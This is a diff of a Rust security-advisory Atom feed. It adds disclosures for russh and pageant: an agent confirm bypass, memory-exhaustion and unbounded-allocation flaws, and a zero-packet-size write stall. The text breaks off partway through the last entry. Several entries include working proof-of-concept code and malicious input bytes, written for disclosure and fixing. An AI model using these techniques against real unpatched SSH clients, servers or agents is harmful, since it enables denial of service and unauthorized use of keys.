@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-10-30T21:13:07.369Z</updated>
+    <updated>2026-10-31T01:12:12.609Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,913 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[russh] russh: Agent server never calls `Agent::confirm`, so keys added with the confirm constraint (`ssh-add -c`) sign without confirmation]]></title>
+        <id>https://github.com/advisories/GHSA-vp5q-ff62-jwqv</id>
+        <link href="https://github.com/advisories/GHSA-vp5q-ff62-jwqv"/>
+        <updated>2026-10-30T22:59:09.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The agent server in <code>russh::keys::agent::server</code> never calls <code>Agent::confirm</code> before signing with a key that was added with the confirm constraint. That constraint is <code>SSH_AGENT_CONSTRAIN_CONFIRM</code> (RFC 9987 §5.2.7.2), which is what <code>ssh-add -c</code> sends.</p>
+<p>The call was replaced by a hard-coded <code>true</code> in 3e04597 ("Native async traits encore", #455), first released in 0.50.0-beta.12. Every release since, up to and including 0.64.1, signs requests for confirm-constrained keys without asking the <code>Agent</code> implementation. A user who added a key with <code>-c</code> is therefore never asked to confirm.</p>
+<h3 id="details">Details</h3>
+<p><code>Connection::try_sign</code> notes that the key needs confirmation, then awaits a ready future instead of the agent (<a href="https://github.com/Eugeny/russh/blob/e5d80a07dc554480b6ea3b2e14adfc190407b627/russh/src/keys/agent/server.rs#L348-L360">server.rs L348-L360 at v0.64.1</a>):</p>
+<pre><code class="language-rust">let agent = if needs_confirm {
+    let (agent, ok) = {
+        let _pk = key.clone();
+        Box::new(futures::future::ready((agent, true)))
+    }
+    .await;
+    if !ok {
+        return Ok((agent, false));
+    }
+    agent
+} else {
+    agent
+};
+</code></pre>
+<p>Before <a href="https://github.com/Eugeny/russh/commit/3e04597dc54e36bfc85c21996f7d8d9d224e9826">3e04597</a> the first statement was <code>let (agent, ok) = agent.confirm(key.clone()).await;</code>.</p>
+<p><code>try_sign</code> was checked in the published crates on crates.io:</p>
+<ul>
+<li>Every russh release from 0.50.0-beta.12 to 0.64.1 (52 versions) has the hard-coded <code>true</code>.</li>
+<li>russh 0.50.0-beta.8 to beta.11 call <code>agent.confirm</code>.</li>
+<li>Earlier russh releases have no agent server. It lived in russh-keys, and no russh-keys release is affected.</li>
+</ul>
+<p>Not affected:</p>
+<ul>
+<li><code>Agent</code> implementations that keep the default <code>confirm</code>, which returns <code>true</code> anyway.</li>
+<li>Checks made in <code>Agent::confirm_request</code>, which is still called with <code>MessageType::Sign</code> for every sign request (<a href="https://github.com/Eugeny/russh/blob/e5d80a07dc554480b6ea3b2e14adfc190407b627/russh/src/keys/agent/server.rs#L158-L159">L158-L159</a>).</li>
+<li>The agent client, and the SSH client and server.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Add this test to <code>mod test</code> in <code>russh/src/keys/mod.rs</code>. It uses the module's existing <code>Incoming</code> helper and <code>ED25519_KEY</code>.</li>
+<li>Run <code>cargo test -p russh --lib keys::test::test_agent_confirms_keys_added_with_the_confirm_constraint</code>.</li>
+</ol>
+<pre><code class="language-rust">#[tokio::test]
+#[cfg(unix)]
+async fn test_agent_confirms_keys_added_with_the_confirm_constraint() {
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    // An agent whose user refuses every confirmation prompt.
+    #[derive(Clone)]
+    struct Refuse(std::sync::Arc&lt;AtomicUsize&gt;);
+    impl agent::server::Agent for Refuse {
+        fn confirm(
+            self,
+            _: std::sync::Arc&lt;PrivateKey&gt;,
+        ) -&gt; Box&lt;dyn Future&lt;Output = (Self, bool)&gt; + Send + Unpin&gt; {
+            self.0.fetch_add(1, Ordering::SeqCst);
+            Box::new(futures::future::ready((self, false)))
+        }
+    }
+
+    let prompts = std::sync::Arc::new(AtomicUsize::new(0));
+    let dir = tempfile::tempdir().unwrap();
+    let agent_path = dir.path().join("agent");
+    let mut listener = tokio::net::UnixListener::bind(&amp;agent_path).unwrap();
+    let agent = Refuse(prompts.clone());
+    tokio::spawn(async move {
+        agent::server::serve(
+            Incoming {
+                listener: &amp;mut listener,
+            },
+            agent,
+        )
+        .await
+    });
+
+    let key = decode_secret_key(ED25519_KEY, Some("blabla")).unwrap();
+    let public = key.public_key().clone();
+    let stream = tokio::net::UnixStream::connect(&amp;agent_path).await.unwrap();
+    let mut client = agent::client::AgentClient::connect(stream);
+    // What `ssh-add -c` sends.
+    client
+        .add_identity(&amp;key, &amp;[agent::Constraint::Confirm])
+        .await
+        .unwrap();
+
+    let signed = client
+        .sign_request(&amp;AgentIdentity::from(public), None, b"data".to_vec())
+        .await;
+    let confirm_calls = prompts.load(Ordering::SeqCst);
+    assert!(
+        signed.is_err(),
+        "the agent signed with a confirm-constrained key without asking: \
+         Agent::confirm was called {confirm_calls} time(s)"
+    );
+    assert_eq!(
+        confirm_calls, 1,
+        "Agent::confirm should be asked exactly once"
+    );
+}
+</code></pre>
+<p>On v0.64.1 (e5d80a0) the test fails:</p>
+<pre><code>the agent signed with a confirm-constrained key without asking: Agent::confirm was called 0 time(s)
+</code></pre>
+<p>With the fix below it passes, and so do all 46 <code>keys::</code> tests.</p>
+<h3 id="impact">Impact</h3>
+<p>A russh-based agent whose <code>Agent::confirm</code> asks the user, or applies any other check, signs every request for a confirm-constrained key without running that check. Anyone who can talk to the agent can then use the key without the user's approval:</p>
+<ul>
+<li>other local processes of the user;</li>
+<li>the remote host, when the agent is forwarded (<code>ssh -A</code>).</li>
+</ul>
+<p>Preventing exactly this is the purpose of the confirm constraint. RFC 9987 §10 names it as what stops an attacker with access to the agent from "stealing use of those keys".</p>
+<p>Because the agent accepts the constraint, <code>ssh-add -c</code> reports success and the user believes the key is protected. RFC 9987 §5.2.7 says an agent that does not support a constraint MUST refuse the key instead.</p>
+<p>The private key itself is not exposed. The impact is unauthorized use of it for as long as the attacker can reach the agent: logging in to other hosts as the user, or signing data such as git commits.</p>
+<p><strong>Known affected downstream user</strong> (from its public code; not tested): Proton Pass desktop, which uses russh 0.62.7.</p>
+<ul>
+<li>It adds every key with <code>Constraint::Confirm</code> (<a href="https://github.com/ProtonMail/WebClients/blob/64862561fea883c1b4360b7338a0102eaad5c0fb/applications/pass-desktop/native/napi/src/ssh_agent/mod.rs#L332">mod.rs L332</a>).</li>
+<li>It uses <code>Agent::confirm</code> as its "Pass is unlocked" check before signing, and defers <code>MessageType::Sign</code> from <code>confirm_request</code> to it (<a href="https://github.com/ProtonMail/WebClients/blob/64862561fea883c1b4360b7338a0102eaad5c0fb/applications/pass-desktop/native/napi/src/ssh_agent/mod.rs#L75-L100">L75-L100</a>). That check never runs.</li>
+<li>Proton also removes keys from the agent on lock and logout (<a href="https://github.com/ProtonMail/WebClients/blob/64862561fea883c1b4360b7338a0102eaad5c0fb/applications/pass/src/app/Store/ssh-agent.middleware.ts#L23-L27">ssh-agent.middleware.ts L23-L27</a>).</li>
+</ul>
+<p>So the exposure there is limited to states in which keys stay loaded while Pass is not unlocked. Their own code notes, for example, that the agent persists across renderer reloads and account switches.</p>
+<h3 id="suggested-fix">Suggested fix</h3>
+<pre><code class="language-diff">--- a/russh/src/keys/agent/server.rs
++++ b/russh/src/keys/agent/server.rs
+@@ -346,11 +346,7 @@ impl&lt;S: AsyncRead + AsyncWrite + Send + Unpin + 'static, A: Agent + Send + Sync
+             }
+         };
+         let agent = if needs_confirm {
+-            let (agent, ok) = {
+-                let _pk = key.clone();
+-                Box::new(futures::future::ready((agent, true)))
+-            }
+-            .await;
++            let (agent, ok) = agent.confirm(key.clone()).await;
+             if !ok {
+                 return Ok((agent, false));
+             }
+</code></pre>
+<p>When <code>confirm</code> returns <code>false</code>, <code>try_sign</code> returns <code>false</code> and the agent answers <code>SSH_AGENT_FAILURE</code>, as it did before the regression.</p>
+<p><strong>Compatibility note for the release notes:</strong> <code>confirm</code> is called again for confirm-constrained keys, so implementations that stub it out will now hit that stub.</p>
+<ul>
+<li>For example, Litterbox implements <code>confirm</code> as <code>todo!()</code> (<a href="https://github.com/Gerharddc/Litterbox/blob/c2cc67b80926affecbaa5905a7480af17b1270f2/litterbox/src/agent.rs#L81-L87">agent.rs L81-L87</a>).</li>
+<li>Each connection runs in its own task, so such a panic ends only that connection.</li>
+</ul>
+<p><strong>Related but separate:</strong> with the default <code>confirm</code>, the agent still accepts the confirm constraint without enforcing it. Given RFC 9987 §5.2.7, refusing such keys when the application does not implement <code>confirm</code> may be worth considering.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-vp5q-ff62-jwqv">https://github.com/Eugeny/russh/security/advisories/GHSA-vp5q-ff62-jwqv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-116794">https://nvd.nist.gov/vuln/detail/CVE-2026-116794</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/3e04597dc54e36bfc85c21996f7d8d9d224e9826">https://github.com/Eugeny/russh/commit/3e04597dc54e36bfc85c21996f7d8d9d224e9826</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/62db6e7defd6d244159da962ccccb029e785ce0f">https://github.com/Eugeny/russh/commit/62db6e7defd6d244159da962ccccb029e785ce0f</a></li>
+<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.65.0">https://github.com/Eugeny/russh/releases/tag/v0.65.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-vp5q-ff62-jwqv">https://github.com/advisories/GHSA-vp5q-ff62-jwqv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vp5q-ff62-jwqv</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-30T22:59:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[pageant] pageant: unbounded frame buffering on peer-controlled 4-byte length prefix (memory-exhaustion DoS)]]></title>
+        <id>https://github.com/advisories/GHSA-662x-8wvj-2276</id>
+        <link href="https://github.com/advisories/GHSA-662x-8wvj-2276"/>
+        <updated>2026-10-30T22:59:03.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>pageant::PageantStream</code> reads a 4-byte big-endian length prefix from its input stream and buffers until <code>len + 4</code> bytes are available, without ever validating <code>len</code>. The underlying WM_COPYDATA transport physically cannot carry frames larger than 8 KiB (<code>_AGENT_MAX_MSGLEN</code>, the fixed-size shared memory mapping), so an oversized frame is destined to fail — but only after the re-framing task has already buffered the full claimed size. A peer controlling the stream bytes can claim a frame of up to ~4 GiB and either stream that much data (forcing a corresponding allocation) or simply stop mid-frame and keep the partial buffer resident indefinitely.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><code>pageant/src/wmmessage.rs</code>, <code>PageantStream::new()</code> (the spawned re-framing task), current main:</p>
+<pre><code class="language-rust">let mut buf = BytesMut::new();
+while let Ok(n) = two.read_buf(&amp;mut buf).await {
+    if n == 0 { break; }
+    if buf.len() &lt; 4 { continue; }
+    let len = BigEndian::read_u32(&amp;buf) as usize;
+    if buf.len() &lt; len + 4 { continue; }   // &lt;-- `len` is trusted; no upper bound
+    let msg = buf.split_to(len + 4).freeze();
+    // ...
+}
+</code></pre>
+<p><code>len</code> is consumed verbatim from the stream, so <code>buf</code> grows towards <code>len + 4</code>. Even a "complete" oversized frame cannot succeed: <code>query_pageant_direct()</code> writes <code>msg</code> into the <code>_AGENT_MAX_MSGLEN</code>-sized (8192 bytes) shared mapping and fails with <code>Error::Overflow</code> for anything larger — the unbounded buffering is therefore pure attacker-controlled memory growth.</p>
+<p>History: introduced in commit <code>6eac7a157dd2cc81b8fafdb2977f1c388fe9784b</code> ("fix Tabby#10301 Still cannot login with pageant", PR #565, 2025-09-25) together with the length-prefixed framing itself; present in every 0.2.x release (0.1.0 predates the length-prefixed loop and is not affected by this issue).</p>
+<h2 id="attack-scenario-ssh-agent-forwarding">Attack scenario (SSH agent forwarding)</h2>
+<p>The crate is documented as a raw transport ("This crate only implements the transport, not the actual SSH agent protocol"). The standard way to service a remote server's forwarded agent channel on Windows is to bridge the SSH channel to the local agent, e.g.:</p>
+<pre><code class="language-rust">// inside Handler::server_channel_open_agent_forward (russh client, sketch)
+let mut channel = channel.into_stream();          // bytes sent by the SSH server
+let mut agent = pageant::PageantStream::new().await?;
+tokio::io::copy_bidirectional(&amp;mut channel, &amp;mut agent).await?;
+</code></pre>
+<p>In this (intended) bridging use, the bytes written into <code>PageantStream</code> are the SSH server's channel payload, so the 4-byte length prefix is controlled by a malicious or compromised SSH server. The server only needs to send the four bytes <code>FF FF F0 00</code>, then stream data (or stall). russh's typed <code>AgentClient</code> bounds the response frames it reads with <code>MAX_AGENT_FRAME_LEN</code> (256 KiB) and builds its own request frames, but the raw stream path — the documented transport usage — has no equivalent bound.</p>
+<p>Impact: remote memory-exhaustion DoS of the client process. A full-size claim lets the peer force buffering of up to ~4 GiB of memory, which on memory-constrained hosts ends in an allocation-failure abort (uncatchable in Rust). Multiple forwarded channels multiply the effect. No memory-safety violation was observed.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>(Windows; no Pageant instance required — buffering happens before any Pageant interaction)</p>
+<pre><code class="language-rust">use tokio::io::AsyncWriteExt;
+
+#[tokio::main(flavor = "current_thread")]
+async fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
+    let mut stream = pageant::PageantStream::new().await?;
+    // Claim a ~4 GiB frame, stream 256 MiB, then stall: the task buffers all of it.
+    stream.write_all(&amp;0xFFFF_F000u32.to_be_bytes()).await?;
+    let chunk = vec![0u8; 256 * 1024];
+    for _ in 0..1024 { stream.write_all(&amp;chunk).await?; } // 256 MiB, frame never completed
+    tokio::time::sleep(std::time::Duration::from_secs(30)).await;
+    Ok(())
+}
+</code></pre>
+<p>Observed on Windows 11, pageant 0.2.4 (source v0.64.1, Rust 1.99): process working set grows from ~7.4 MB to ~264.7 MB after 256 MiB is streamed, and stays there while the peer stalls; no error is ever raised. Memory grows linearly with bytes sent, up to the claimed length. (Allocation behavior additionally verified with a counting global allocator.)</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Reject frames that cannot fit the transport before buffering:</p>
+<pre><code class="language-diff">                 let len = BigEndian::read_u32(&amp;buf) as usize;
++                // The WM_COPYDATA transport is backed by a fixed-size shared
++                // memory mapping: larger requests can never fit. Reject them
++                // before buffering. Without this cap a malicious peer could
++                // force up to ~4 GiB of buffering by claiming a huge frame
++                // and never completing it.
++                if len.saturating_add(4) &gt; _AGENT_MAX_MSGLEN {
++                    debug!("dropping oversized Pageant request: {len} bytes");
++                    break;
++                }
+                 if buf.len() &lt; len + 4 {
+                     continue;
+                 }
+</code></pre>
+<p><code>saturating_add</code> also removes a theoretical 32-bit <code>len + 4</code> overflow. <code>break</code> shuts down the re-framing task (the writer observes the stream close); returning an error through the stream would work equally well. Happy to submit a PR with this change, or with any alternative you prefer.</p>
+<h2 id="reporter">Reporter</h2>
+<p>Tshellauth</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-662x-8wvj-2276">https://github.com/Eugeny/russh/security/advisories/GHSA-662x-8wvj-2276</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-116775">https://nvd.nist.gov/vuln/detail/CVE-2026-116775</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/69e4b55513eaa8ac9d2ad4236f13171fc164e10a">https://github.com/Eugeny/russh/commit/69e4b55513eaa8ac9d2ad4236f13171fc164e10a</a></li>
+<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.65.0">https://github.com/Eugeny/russh/releases/tag/v0.65.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-662x-8wvj-2276">https://github.com/advisories/GHSA-662x-8wvj-2276</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-662x-8wvj-2276</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-10-30T22:59:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[russh] russh: peer-declared zero maximum packet size permanently stalls channel writes (silent AsyncWrite hang)]]></title>
+        <id>https://github.com/advisories/GHSA-fw5c-8223-6h42</id>
+        <link href="https://github.com/advisories/GHSA-fw5c-8223-6h42"/>
+        <updated>2026-10-30T22:58:55.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A peer can advertise <code>maximum packet size = 0</code> in its channel-open message (<code>CHANNEL_OPEN</code> when attacking a server, <code>CHANNEL_OPEN_CONFIRMATION</code> when attacking a client). russh accepts the value without validation and copies it into the channel write state, where it caps the size of every outgoing data chunk. In the <code>AsyncWrite</code> code path (<code>ChannelTx::poll_writable</code>, used by <code>Channel::data()</code>, <code>Channel::make_writer()</code> and <code>Channel::into_stream()</code>), a cap of 0 makes every write future stay <code>Poll::Pending</code> forever: <code>writable = max_packet_size.min(window_size).min(buf_len)</code> is always 0, and no future event can ever raise it (a static maximum packet size of 0 can never be satisfied by any amount of peer-granted window). The write neither completes nor errors, so the application task hangs silently.</p>
+<p>Every other write path in russh already treats <code>max_packet_size == 0</code> as an error (<code>Error::Inconsistent</code>): <code>Channel::reserve_writable_chunk</code> (<code>russh/src/channels/mod.rs:363-365</code>) and the session packetizers (<code>russh/src/session.rs:489-492</code> and <code>549-552</code>). The <code>AsyncWrite</code> path is the only one that lacks the guard - it contradicts the crate's own invariant.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>(1) Peer value accepted without validation:</p>
+<ul>
+<li><code>russh/src/parsing.rs:44</code> (<code>OpenChannelMessage::parse</code>): <code>let maxpacket = map_err!(u32::decode(r))?;</code> stored as <code>recipient_maximum_packet_size</code> (<code>:25-30</code>); no range check. Same for <code>ChannelOpenConfirmation::decode</code> at <code>russh/src/parsing.rs:194-207</code>.</li>
+<li>The only packet-size validation anywhere is an upper bound on the <em>local</em> config that merely logs (<code>russh/src/client/mod.rs:1189-1194</code>, <code>russh/src/server/mod.rs:912-917</code>). Nothing validates the peer's value - 0 passes silently.</li>
+</ul>
+<p>(2) The value flows into the channel write state verbatim:</p>
+<ul>
+<li>Server: <code>russh/src/server/encrypted.rs:1877-1900</code> - <code>ChannelParams { recipient_maximum_packet_size: msg.recipient_maximum_packet_size, .. }</code>, then <code>Channel::new(..., channel_params.recipient_maximum_packet_size, ...)</code>.</li>
+<li>Client: <code>russh/src/client/encrypted.rs:471-488</code> - <code>parameters.confirm(&amp;msg)</code> (<code>russh/src/lib_inner.rs:519-523</code>) and <code>ChannelMsg::Open { max_packet_size: msg.maximum_packet_size, .. }</code>, consumed by <code>wait_channel_confirmation</code> (<code>russh/src/client/mod.rs:698-722</code>), which builds <code>ChannelWriteHalf { max_packet_size, .. }</code>.</li>
+<li>The write half hands the value to the writer: <code>make_writer_ext</code> (<code>russh/src/channels/mod.rs:433-441</code>) and <code>into_stream</code> (<code>russh/src/channels/mod.rs:661-670</code>) pass <code>self.max_packet_size</code> to <code>ChannelTx::new</code>.</li>
+</ul>
+<p>(3) The hang - <code>russh/src/channels/io/tx.rs:82-108</code> (current v0.64.1, byte-identical in v0.60.0):</p>
+<pre><code class="language-rust">fn poll_writable(&amp;mut self, cx: &amp;mut Context&lt;'_&gt;, buf_len: usize) -&gt; Poll&lt;NonZeroUsize&gt; {
+    ...
+    let writable = (self.max_packet_size).min(*window_size).min(buf_len as u32) as usize;
+    match NonZeroUsize::try_from(writable) {
+        Ok(w) =&gt; {
+            *window_size -= writable as u32;
+            if *window_size &gt; 0 {
+                self.notify.notify_one();
+            }
+            Poll::Ready(w)
+        }
+        Err(_) =&gt; {
+            drop(window_size);
+            ready!(self.window_size_notication.poll_unpin(cx));
+            self.window_size_notication = WatchNotification::new(Arc::clone(&amp;self.notify));
+            cx.waker().wake_by_ref();
+            Poll::Pending
+        }
+    }
+}
+</code></pre>
+<p>With <code>max_packet_size == 0</code>, <code>writable</code> is always 0 regardless of <code>window_size</code> and <code>buf_len</code>; the task parks on the window notification, gets re-polled on every <code>CHANNEL_WINDOW_ADJUST</code>, recomputes 0, and parks again - forever.</p>
+<p>(4) The guard exists everywhere else:</p>
+<pre><code class="language-rust">// russh/src/channels/mod.rs:363-365 (used by send_bytes -&gt; data_bytes / extended_data_bytes)
+if self.max_packet_size == 0 {
+    return Err(Error::Inconsistent);
+}
+
+// russh/src/session.rs:490-492 and :550-552 (packetizer)
+if max_packet_size == 0 {
+    return Err(crate::Error::Inconsistent);
+}
+</code></pre>
+<p>Note that <code>Channel::data(reader)</code> (<code>russh/src/channels/mod.rs:321-323</code>) goes through <code>send_data</code> -&gt; <code>tokio::io::copy(&amp;mut data, &amp;mut tx)</code> (<code>:350-360</code>) into the same <code>ChannelTx</code>, so the primary documented data API hangs as well; only the <code>*_bytes</code> variants reach the guard.</p>
+<h2 id="attack-scenarios">Attack scenarios</h2>
+<ul>
+<li><strong>Server (authenticated remote DoS)</strong>: with the default configuration, an authenticated client opens a session channel advertising <code>maximum packet size = 0</code>. Whenever the server application writes on that channel through <code>AsyncWrite</code> (echo, shell prompts, SFTP - russh's own examples echo via <code>into_stream()</code>), the write future never completes. The handler task is stranded and no error surfaces, so application cleanup paths do not trigger. Repeat per channel and per connection; keep-alive traffic resets the server <code>inactivity_timeout</code> (default 600 s), so stranded resources persist as long as the attacker wants.</li>
+<li><strong>Client (malicious server)</strong>: a malicious or buggy server confirms an opened channel with <code>maximum packet size = 0</code>; the client application's writes on that channel stall forever. The client <code>inactivity_timeout</code> defaults to <code>None</code>, so nothing ever tears the session down.</li>
+<li>This is distinct from a <code>window_size == 0</code> stall: a zero window is dynamic flow control that a well-behaved peer releases as soon as its buffers drain, while <code>maximum packet size</code> is a static peer declaration where 0 can never be satisfied by any future packet. RFC 4254 section 5.1 recommends a minimum of 32768 - legitimate peers do not send 0.</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<p>Permanent, silent denial of service for the affected writes, with stranded tasks/channels/connections that accumulate for the attacker - resource exhaustion of a server or of a client application. Because the failure mode is <code>Poll::Pending</code> instead of <code>Err</code>, ordinary application mitigations (error handling, timeouts on writes, connection teardown) do not engage on their own.</p>
+<h2 id="reproducer">Reproducer</h2>
+<p>Two stock russh instances are enough (no raw SSH crafting required):</p>
+<ol>
+<li>Server: default config plus a host key; <code>channel_open_session</code> accepts and echoes using <code>tokio::io::copy</code> into <code>channel.into_stream()</code> (the pattern from russh's own examples).</li>
+<li>Client: default config except <code>config.maximum_packet_size = 0</code> (accepted silently; see above), then <code>authenticate_publickey</code>, <code>channel_open_session().await</code>, <code>channel.data(&amp;b"hello"[..]).await</code>.</li>
+</ol>
+<p>The client's <code>CHANNEL_OPEN</code> goes out with <code>maximum packet size = 0</code> (<code>russh/src/client/session.rs:21-44</code> encodes <code>self.common.config.maximum_packet_size</code> verbatim). All three scenarios below were verified end-to-end against a stock russh v0.64.1 build (ring backend), default settings otherwise:</p>
+<ul>
+<li>control (both sides default, 32768): the server echoes and the client receives <code>hello</code>;</li>
+<li>client <code>maximum_packet_size = 0</code>: the server prints the received bytes and then the echo write never completes - no data, no error, the client times out;</li>
+<li>server <code>maximum_packet_size = 0</code>: the client's <code>channel.data(...)</code> future never completes - no error, it times out.</li>
+</ul>
+<p>Observed output (abridged):</p>
+<pre><code>=== SCENARIO A (control): both sides default (maxpacket 32768) ===
+[server] read 5 bytes; echoing via AsyncWrite ...
+[server] echo write completed
+RESULT A: echo received: "hello"
+
+=== SCENARIO B: client advertises maximum_packet_size = 0 ===
+[server] read 5 bytes; echoing via AsyncWrite ...
+RESULT B: TIMEOUT after 6s - server-side echo write is permanently stalled (no error, no data)
+
+=== SCENARIO C: server advertises maximum_packet_size = 0 ===
+RESULT C: TIMEOUT after 6s - client-side channel.data() is permanently stalled
+</code></pre>
+<p>The server task stays parked inside <code>ChannelTx::poll_writable</code>; nothing is logged and nothing is returned to the handler. The harness source (server: <code>into_stream()</code> echo; client: one config toggle) can be attached on request.</p>
+<p>Unit-level sketch of the core defect:</p>
+<pre><code class="language-rust">let mut tx = ChannelTx::&lt;Msg&gt;::new(
+    sender, ChannelId(0),
+    Arc::new(Mutex::new(4096)),   // window_size
+    Arc::new(Notify::new()),      // notify
+    0,                            // max_packet_size
+    None,
+);
+// poll_write(&amp;mut tx, cx, b"x") stays Poll::Pending forever,
+// even after CHANNEL_WINDOW_ADJUST raises `window_size`.
+</code></pre>
+<h2 id="suggested-fix">Suggested fix</h2>
+<ul>
+<li><strong>Validate at parse time (preferred)</strong>: reject <code>maximum_packet_size == 0</code> with <code>Error::Inconsistent</code> in <code>OpenChannelMessage::parse</code> and <code>ChannelOpenConfirmation::decode</code> (<code>russh/src/parsing.rs</code>), consistent with the existing guards; optionally clamp any value below the RFC 4254 recommended minimum (32768) instead.</li>
+<li><strong>Defense in depth</strong>: in <code>ChannelTx::poll_writable</code> (<code>russh/src/channels/io/tx.rs:82</code>), when <code>self.max_packet_size == 0</code>, surface an <code>io::Error</code> from <code>poll_write</code> instead of returning <code>Poll::Pending</code>.</li>
+</ul>
+<p>Both match the treatment PR #695 already applied to the other write paths in v0.61.0 (the <code>reserve_writable_chunk</code> and session packetizer guards).</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>Verified by inspecting the release artifacts: <strong>0.60.0 through 0.64.1 (current) are affected</strong> - <code>poll_writable</code> is byte-identical in v0.60.0 and the peer-value plumbing is present in all of them. The <code>ChannelTx</code> write logic and the peer-value flow predate 0.60 (they go back to the <code>channels::io</code> refactor), so we recommend treating all releases that ship <code>channels::io::ChannelTx</code> as affected. The zero-guards in the other write paths were only added in 0.61.0, so on 0.60.x those paths do not even fail with an error.</p>
+<h2 id="reporter">Reporter</h2>
+<p>Tshellauth</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-fw5c-8223-6h42">https://github.com/Eugeny/russh/security/advisories/GHSA-fw5c-8223-6h42</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-116774">https://nvd.nist.gov/vuln/detail/CVE-2026-116774</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/39cb9dbaa37caf555d34c6c22efa3bbbff9e186c">https://github.com/Eugeny/russh/commit/39cb9dbaa37caf555d34c6c22efa3bbbff9e186c</a></li>
+<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.65.0">https://github.com/Eugeny/russh/releases/tag/v0.65.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-fw5c-8223-6h42">https://github.com/advisories/GHSA-fw5c-8223-6h42</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fw5c-8223-6h42</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-30T22:58:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[russh] russh's SSH agent server is susceptible to unbound allocations via repeated SSH_AGENT_CONSTRAIN_CONFIRM messages]]></title>
+        <id>https://github.com/advisories/GHSA-9wfm-jcj8-jfv9</id>
+        <link href="https://github.com/advisories/GHSA-9wfm-jcj8-jfv9"/>
+        <updated>2026-10-30T22:58:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><strong>All evidence, reproduction steps, and scripts in the report were verified against a real running instance. Nothing is fabricated or synthetic; every verdict is backed by captured output from an actual deployment.</strong></p>
+<p>The SSH agent server that ships with russh (<code>russh::keys::agent::server::serve</code>) parses client key-addition requests and, for each <code>SSH_AGENT_CONSTRAIN_CONFIRM</code> (0x02) record it finds, pushes one <code>Constraint::Confirm</code> value into a per-key vector inside an unbounded loop, then stores the resulting pair permanently in its keystore (<code>russh/src/keys/agent/server.rs:296-303</code>). Neither the constraint vector nor the keystore has a size or count limit: the only boundary is the 256 KiB agent frame cap, and every 1-byte record a client sends becomes a 56-byte enum retained for the life of the process. Any process that can connect to the agent socket - the same trust model the project itself established when fixing a prior advisory about this same request handler - can therefore grow the agent's memory without bound and renew the growth at will: six 256 KiB requests retained 72.4 MiB (about 12.1 MiB per request, a roughly 48-fold amplification) while an equal number of unconstrained key additions retained nothing, measured against the unmodified server through its public API on v0.64.1. The earlier fix for that prior advisory deduplicates only the sibling <code>SSH_AGENT_CONSTRAIN_LIFETIME</code> (0x01) record type and leaves this parallel variant untouched, and since constrained keys never expire the retained memory is never reclaimed.</p>
+<h3 id="details">Details</h3>
+<p>When a client adds a key with constraints, the server walks the constraint section byte by byte and collects typed values with no upper bound on how many it will accept:</p>
+<pre><code class="language-text">russh/src/keys/agent/server.rs:296-297 (v0.64.1 = main = e5d80a07dc554480b6ea3b2e14adfc190407b627)
+    } else if t == msg::CONSTRAIN_CONFIRM {
+        c.push(Constraint::Confirm)      // inside the record loop, no length cap
+russh/src/keys/agent/server.rs:303-308
+    - the (key, timestamp, constraints) triple is inserted into the keystore,
+      and keys without a LIFETIME constraint never expire
+</code></pre>
